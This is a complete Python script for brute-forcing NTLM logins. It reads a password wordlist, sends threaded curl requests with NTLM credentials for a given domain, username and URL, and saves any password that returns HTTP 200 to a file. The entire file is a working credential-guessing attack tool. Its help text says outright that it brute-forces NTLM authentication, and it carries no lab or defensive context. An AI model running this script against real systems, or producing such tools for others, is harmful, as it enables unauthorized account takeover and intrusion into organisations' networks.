#!/usr/bin/env python3
import argparse
import concurrent.futures
import subprocess
import sys
import threading

def attempt_login(domain, username, password, url):
    cmd = [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
        "--ntlm", "-u", f"{domain}\\{username}:{password}", url
    ]
    try:
        result = subprocess.check_output(cmd, text=True).strip()
    except subprocess.CalledProcessError as e:
        print(f"Command failed with error: {e}")
        result = ""
    return result

def check_password_chunk(domain, username, passwords_chunk, url, result_dict, start_idx, counter, lock):
    for idx, password in enumerate(passwords_chunk):
        password = password.strip()
        http_code = attempt_login(domain, username, password, url)
        result_dict[start_idx + idx] = (password, http_code)

        with lock:
            counter[0] += 1  # Increment the attempt counter
            update_progress(counter[0], total_passwords)

def update_progress(attempted, total):
    sys.stdout.write(f'\rAttempted {attempted}/{total} passwords')
    sys.stdout.flush()

def main():
    # Set up argument parsing
    parser = argparse.ArgumentParser(
        description="Brute-force NTLM authentication using a wordlist."
    )
    parser.add_argument(
        "--domain",
        required=True,
        help="The domain to use for NTLM authentication."
    )
    parser.add_argument(
        "--username",
        required=True,
        help="The username to use for NTLM authentication."
    )
    parser.add_argument(
        "--url",
        required=True,
        help="The URL to test NTLM authentication against."
    )
    parser.add_argument(
        "--wordlist",
        required=True,
        help="Path to the wordlist file containing possible passwords."
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=4,
        help="Number of threads to use for password attempts."
    )

    args = parser.parse_args()

    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = file.readlines()
    except IOError:
        print(f"Error: Could not read file {args.wordlist}")
        sys.exit(1)

    global total_passwords
    total_passwords = len(passwords)
    chunk_size = (total_passwords + args.threads - 1) // args.threads  # Calculate chunk size
    result_dict = {}

    global counter
    counter = [0]  # Use a list to make it mutable
    global counter_lock
    counter_lock = threading.Lock()  # Lock to ensure thread-safe counter updates

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = []
            for i in range(0, total_passwords, chunk_size):
                chunk = passwords[i:i + chunk_size]
                futures.append(executor.submit(check_password_chunk, args.domain, args.username, chunk, args.url, result_dict, i, counter, counter_lock))

            # Wait for all threads to complete or be interrupted
            for future in concurrent.futures.as_completed(futures):
                future.result()  # Wait for future to complete

    except KeyboardInterrupt:
        print("\nInterrupted by user, cleaning up...")

    print()  # Print a newline after completion to clear the last progress update

    # Check for successful password
    found = False
    for idx in sorted(result_dict):
        pwd, http_code = result_dict[idx]
        if http_code == "200":
            print(f"\nPassword found: {pwd}")
            with open("found_password.txt", "w", encoding='utf-8') as found_file:
                found_file.write(pwd)
            found = True
            break

    if not found:
        print("\nPassword not found :(")

if __name__ == "__main__":
    main()
